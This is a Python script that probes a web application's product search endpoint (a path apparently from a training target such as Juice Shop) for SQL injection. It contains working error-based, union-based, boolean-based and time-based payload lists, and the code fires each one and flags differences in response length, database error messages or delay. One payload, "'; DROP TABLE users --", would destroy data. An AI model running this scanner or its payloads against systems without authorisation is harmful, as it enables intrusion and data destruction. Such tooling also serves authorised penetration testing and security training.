import requests
import time

def sql_injection_check(url):
    """
    Attempts multiple SQL injection techniques:
    1. Error-based injection
    2. Union-based injection
    3. Boolean-based injection
    4. Time-based injection

    Returns a list of vulnerabilities if found, otherwise None.
    """

    # Common error-based payloads
    error_payloads = [
        "' OR '1'='1",            # Classic
        "' OR 1=1--",             # MySQL style comment
        "' UNION SELECT NULL--",  # Basic union test
        "' UNION SELECT NULL, NULL--",
        "'; DROP TABLE users --"
    ]

    # Boolean-based payloads (comparing true vs. false)
    # The idea: we add a condition that should be true or false, 
    # then compare response lengths or statuses
    boolean_payloads = [
        "' AND 1=1--",  # Should be true
        "' AND 1=2--"   # Should be false
    ]

    # Time-based payloads (works if DB supports time delays)
    # Adjust the sleep time or function depending on the DB
    time_payloads = [
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",    # MSSQL
        "'; SELECT pg_sleep(5)--",                # PostgreSQL
        "'; SELECT sleep(5)--",                   # MySQL
    ]

    # We’ll store the vulnerabilities found
    vulnerabilities = []

    # A helper function to check responses
    def check_response(base_text, test_text, desc):
        """
        Compare the base_text with test_text to see if 
        there's a significant difference indicating injection.
        """
        # Simple check: big difference in length or an error keyword
        length_diff = abs(len(base_text) - len(test_text))
        error_keywords = ["sql syntax error", "warning", "mysql", "odbc", "native client",
                          "psql", "error in your sql syntax", "unclosed quotation mark"]
        if length_diff > 50:
            return True
        if any(kw in test_text.lower() for kw in error_keywords):
            return True
        return False

    # 1. Get baseline response
    base_url = f"{url}/rest/products/search?q=test"
    try:
        base_resp = requests.get(base_url, timeout=10)
        base_text = base_resp.text
    except:
        # If the baseline request fails, we can't proceed
        return None

    # 2. Error-Based & Union-Based Testing
    for payload in error_payloads:
        test_url = f"{url}/rest/products/search?q={payload}"
        try:
            resp = requests.get(test_url, timeout=10)
            if check_response(base_text, resp.text, "Error/Union"):
                vulnerabilities.append(f"Error-based or Union-based SQLi with payload: {payload}")
        except:
            pass

    # 3. Boolean-Based Testing
    # We do a pairwise check: one payload that should be TRUE, one that should be FALSE.
    # If the lengths differ significantly, we likely have a boolean-based injection.
    if len(boolean_payloads) == 2:
        true_payload = boolean_payloads[0]
        false_payload = boolean_payloads[1]

        # True payload
        true_url = f"{url}/rest/products/search?q={true_payload}"
        # False payload
        false_url = f"{url}/rest/products/search?q={false_payload}"

        try:
            true_resp = requests.get(true_url, timeout=10)
            false_resp = requests.get(false_url, timeout=10)

            # Compare length differences
            len_true = len(true_resp.text)
            len_false = len(false_resp.text)
            if abs(len_true - len_false) > 50:
                vulnerabilities.append("Boolean-based SQLi detected.")
        except:
            pass

    # 4. Time-Based Testing
    # We measure how long the server takes to respond to a time-based injection.
    # If the response time is significantly longer, injection might be successful.
    for payload in time_payloads:
        test_url = f"{url}/rest/products/search?q={payload}"
        start_time = time.time()
        try:
            resp = requests.get(test_url, timeout=10)
        except:
            # If it times out or fails, it might be an indicator (but also might be network)
            pass
        end_time = time.time()
        elapsed = end_time - start_time
        # If the request took ~5 seconds more than baseline, it's suspicious
        if elapsed > 4:  # You can adjust threshold
            vulnerabilities.append(f"Time-based SQLi with payload: {payload} (took {elapsed:.2f}s)")

    return vulnerabilities if vulnerabilities else None
